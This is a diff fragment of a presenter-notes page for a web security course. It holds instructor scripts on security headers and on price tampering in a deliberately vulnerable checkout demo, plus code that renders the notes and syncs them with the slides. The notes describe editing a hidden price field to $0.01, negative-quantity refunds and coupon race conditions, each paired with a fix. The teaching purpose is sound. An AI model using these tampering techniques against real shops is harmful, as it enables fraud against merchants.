+      "Remind: securityheaders.com grades production sites. Have students test their own sites or favourite sites as homework.",
+    ],
+    checklist: [
+      "curl -I in vulnerable mode — show missing headers",
+      "curl -I in safe mode — show all six headers",
+      "Walk through each header + what it blocks",
+      "Show clickjacking PoC code in theory panel",
+      "Mention securityheaders.com as a tool",
+      "Show the six-line Flask implementation",
+    ],
+    tips: [
+      "If you have internet access, live-demo securityheaders.com on a well-known Indian banking site. The scores are often surprising and make the lesson immediately relevant.",
+    ],
+  },
+
+  // 12 — Business Logic
+  {
+    title: "Business Logic — Price Tampering",
+    owasp: "A04:2021",
+    timing: [
+      { label: "~12 min", color: "var(--orange)" },
+      { label: "Needs Burp or devtools", color: "var(--yellow)" },
+    ],
+    script: [
+      { icon: "🎤", text: "Business logic bugs are the hardest to find with automated tools — there are no signatures to match. No injection pattern. No scan rule. You find them by thinking: what is this feature supposed to do, and what happens if I don't do that?" },
+      { icon: "💡", text: "The checkout form has a price field. It's a hidden input — but it's still in the POST body. The server reads it and uses it to calculate the total." },
+      { icon: "⚡", text: "Select the Laptop — $999.99. Right-click the price field, Inspect Element. Change the value to 0.01. Submit. Order placed: Laptop × 1 = $0.01." },
+      { icon: "💡", text: "Or use the form directly — it's not hidden in our demo. Change the price field. Same result. The point is: the server trusted the client to tell it the price. The client lied." },
+      { icon: "🛡️", text: "Fix: the server ignores the client-supplied price. It receives item_id, looks up the price in its own database, calculates total. Client controls quantity. That's it. Server controls everything else." },
+    ],
+    questions: [
+      "Can negative quantity be exploited here? (quantity=-1 → total = negative → refund created)",
+      "Race conditions in checkout — how would you test? (Burp Turbo Intruder, two threads applying same coupon simultaneously)",
+      "Payment gateway integration — does the same logic bug apply at the gateway level? (yes — some gateways trusted the amount field from the merchant)",
+    ],
+    mistakes: [
+      "Students think you need Burp to find this — DevTools is enough. Right-click → Inspect → edit HTML. Then submit.",
+      "Remind: business logic bugs often require testing every numeric field — qty, discount, shipping, tax. Not just price.",
+      "The fix seems obvious in hindsight. Explain: developers write this code under deadline pressure. The form works. They ship it.",
+    ],
+    checklist: [
+      "Show the checkout form",
+      "Inspect element → change price to 0.01",
+      "Submit and show $0.01 order",
+      "Try negative quantity",
+      "Switch to safe mode — show server-side price lookup",
+      "Show the code diff — one line change",
+      "Discuss: why no scanner finds this",
+    ],
+    tips: [
+      "Ask students: 'How many e-commerce sites do you think have this exact bug right now?' The answer is more than they expect. This is common, especially in Laravel, Django, and Ruby on Rails apps where form data is auto-bound to models.",
+    ],
+  },
+];
+
+// ── STATE ────────────────────────────────────────────────────────────────────
+let currentIdx = 0;
+let pollInterval = null;
+
+function init() {
+  buildMiniSidebar();
+  renderNotes(0);
+  startPolling();
+}
+
+function buildMiniSidebar() {
+  const sb = document.getElementById("mini-sidebar");
+  NOTES.forEach((n, i) => {
+    const el = document.createElement("div");
+    el.className = "mini-item";
+    el.dataset.idx = i;
+    el.textContent = i === 0 ? "Intro" : n.title.split("—")[0].trim();
+    sb.appendChild(el);
+  });
+}
+
+function updateMiniSidebar(idx) {
+  document.querySelectorAll(".mini-item").forEach(el => {
+    el.classList.toggle("active", parseInt(el.dataset.idx) === idx);
+    if (parseInt(el.dataset.idx) === idx) {
+      el.scrollIntoView({ behavior: "smooth", block: "nearest" });
+    }
+  });
+}
+
+function renderNotes(idx) {
+  currentIdx = idx;
+  updateMiniSidebar(idx);
+  const n = NOTES[idx];
+  if (!n) return;
+
+  const timingHtml = (n.timing || []).map(t =>
+    `<span class="time-pill" style="color:${t.color};border-color:${t.color};">${t.label}</span>`
+  ).join("");
+
+  const scriptHtml = (n.script || []).map(s =>
+    `<div class="script-line"><span class="script-icon">${s.icon}</span><div class="script-text">${s.text}</div></div>`
+  ).join("");
+
+  const questionsHtml = (n.questions || []).map(q =>
+    `<div class="question-card">❓ ${q}</div>`
+  ).join("");
+
+  const mistakesHtml = (n.mistakes || []).map(m =>
+    `<div class="mistake-card">⚠ ${m}</div>`
+  ).join("");
+
+  const checkHtml = (n.checklist || []).map(c =>
+    `<li><span class="check">☐</span>${c}</li>`
+  ).join("");
+
+  const tipsHtml = (n.tips || []).map(t =>
+    `<div class="tip-card">💡 ${t}</div>`
+  ).join("");
+
+  document.getElementById("notes-content").innerHTML = `
+    <div class="module-indicator">
+      <div class="module-num">${idx < 10 ? "0"+idx : idx}</div>
+      <div>
+        <div class="module-info-title">${n.title}</div>
+        <div class="module-info-owasp">${n.owasp}</div>
+      </div>
+    </div>
+
+    <div class="timing-bar">${timingHtml}</div>
+
+    ${scriptHtml ? `
+    <div class="notes-section">
+      <div class="notes-section-title">What to Say</div>
+      ${scriptHtml}
+    </div>` : ""}
+
+    ${questionsHtml ? `
+    <div class="notes-section">
+      <div class="notes-section-title">Questions to Ask Students</div>
+      ${questionsHtml}
+    </div>` : ""}
+
+    ${mistakesHtml ? `
+    <div class="notes-section">
+      <div class="notes-section-title">Common Student Mistakes to Watch For</div>
+      ${mistakesHtml}
+    </div>` : ""}
+
+    ${checkHtml ? `
+    <div class="notes-section">
+      <div class="notes-section-title">Demo Checklist</div>
+      <ul class="checklist">${checkHtml}</ul>
+    </div>` : ""}
+
+    ${tipsHtml ? `
+    <div class="notes-section">
+      <div class="notes-section-title">Teaching Tips</div>
+      ${tipsHtml}
+    </div>` : ""}
+  `;
+}
+
+// ── POLLING (sync with main presentation) ────────────────────────────────────
+function startPolling() {
+  pollInterval = setInterval(async () => {
+    try {
+      const r = await fetch("/api/presentation/state");
+      const data = await r.json();
+      const dot = document.getElementById("sync-dot");
+      const label = document.getElementById("sync-label");
+      dot.className = "sync-dot live";
+      label.textContent = "live sync";
+      if (data.module !== currentIdx) {
+        renderNotes(data.module);
+      }
+    } catch(e) {
+      document.getElementById("sync-dot").className = "sync-dot";
+      document.getElementById("sync-label").textContent = "disconnected";
+    }
+  }, 1000);
+}
+
+init();
+</script>
+</body>
+</html>
